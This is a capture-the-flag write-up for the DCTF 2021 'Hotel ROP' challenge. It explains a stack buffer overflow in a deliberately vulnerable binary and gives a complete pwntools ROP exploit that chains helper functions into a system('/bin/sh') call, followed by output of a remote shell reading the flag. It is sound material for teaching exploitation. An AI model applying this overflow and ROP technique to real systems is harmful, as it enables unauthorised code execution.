# DCTF 2021

## Hotel ROP

> 400
> 
> They say programmers' dream is California. And because they need somewhere to stay, we've built a hotel!
> 
> `nc dctf1-chall-hotel-rop.westeurope.azurecontainer.io 7480`
>
> [hotel\_rop](hotel_rop)

Tags: _pwn_ _x86-64_ _bof_ _rop_


## Summary

Intended solution for BOF/ROP challenge with batteries included (no need for _ret2libc_)--some assembly required (not [_that_](https://en.wikipedia.org/wiki/Shellcode) kind of assembly).




## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

No canary--BOF.  PIE enabled, but useless since the location of `main` is leaked from the start--ROP.


### Decompile with Ghidra

```c
void vuln(void)
{
  char local_28 [28];
  int local_c;
  
  puts("You come here often?");
  fgets(local_28,0x100,stdin);
  if (local_c == 0) {
    puts("Oh! You are already a regular visitor!");
  }
  else {
    puts("I think you should come here more often.");
  }
  return;
}
```

`fgets` will _get_ `0x100` (256) bytes into a `28` byte buffer smashing the stack.

There are various ways to win here, but I went with the intended solution:

```c
void loss(int param_1,int param_2)
{
  if (param_2 + param_1 == 0xdeadc0de) {
    puts("Dis is da wae to be one of our finest guests!");
    if (param_1 == 0x1337c0de) {
      puts("Now you can replace our manager!");
      system((char *)&win_land);
      exit(0);
    }
  }
  return;
}
```

There's a `win` function here called `loss` that will execute `system` with the global `win_land`.  However, `win_land` is all null; the two functions `california` and `silicon_valley` fill that void:

```
void california(void)
{
  puts("Welcome to Hotel California");
  puts("You can sign out anytime you want, but you can never leave");
  *(undefined *)((long)&win_land + (long)len) = 0x2f;
  len = len + 1;
  *(undefined *)((long)&win_land + (long)len) = 0x62;
  len = len + 1;
  *(undefined *)((long)&win_land + (long)len) = 0x69;
  len = len + 1;
  *(undefined *)((long)&win_land + (long)len) = 0x6e;
  len = len + 1;
  return;
}

void silicon_valley(void)
{
  puts("You want to work for Google?");
  *(undefined *)((long)&win_land + (long)len) = 0x2f;
  len = len + 1;
  *(undefined *)((long)&win_land + (long)len) = 0x73;
  len = len + 1;
  *(undefined *)((long)&win_land + (long)len) = 0x68;
  len = len + 1;
  *(undefined *)((long)&win_land + (long)len) = 0;
  len = len + 1;
  return;
}
```

Kinda all down hill from here.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./hotel_rop')

if args.REMOTE:
    p = remote('dctf1-chall-hotel-rop.westeurope.azurecontainer.io', 7480)
else:
    p = process(binary.path)

p.recvuntil('on main street ')
main = int(p.recvline().strip(),16)
log.info('main: ' + hex(main))
binary.address = main - binary.sym.main
log.info('binary.address: ' + hex(binary.address))
```

As stated above, we get the location of `main` for free, with this we can compute the base process address which is required for ROP.

```python
pop_rdi = next(binary.search(asm('pop rdi; ret')))
pop_rsi_r15 = next(binary.search(asm('pop rsi; pop r15; ret')))
```

`loss` requires two parameters; we'll need `pop rdi` and `pop rsi` gadgets.  Since `pop rsi` is followed by `pop r15`, we'll have to provide a dummy value.

```python
payload  = b''
payload += 0x28 * b'A'
payload += p64(binary.sym.california)
payload += p64(binary.sym.silicon_valley)
payload += p64(pop_rdi)
payload += p64(0x1337c0de)
payload += p64(pop_rsi_r15)
payload += p64(0xdeadc0de - 0x1337c0de)
payload += p64(0)
payload += p64(binary.sym.loss)

p.sendlineafter('?\n',payload)
p.interactive()
```

And here's the chain.  Start with the two helper functions to set `win_land`, then pop into `rdi` and `rsi` the values for `param1` and `param2` (with a zero for `r15`) then call `loss` FTW!


[_You can_ win for losing](https://www.urbandictionary.com/define.php?term=can%27t%20win%20for%20losing).


Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/dctf2021/hotel_rop/hotel_rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to dctf1-chall-hotel-rop.westeurope.azurecontainer.io on port 7480: Done
[*] main: 0x5650b58f536d
[*] binary.address: 0x5650b58f4000
[*] Switching to interactive mode
I think you should come here more often.
Welcome to Hotel California
You can sign out anytime you want, but you can never leave
You want to work for Google?
Dis is da wae to be one of our finest guests!
Now you can replace our manager!
$ cat flag.txt
dctf{ch41n_0f_h0t3ls}
```
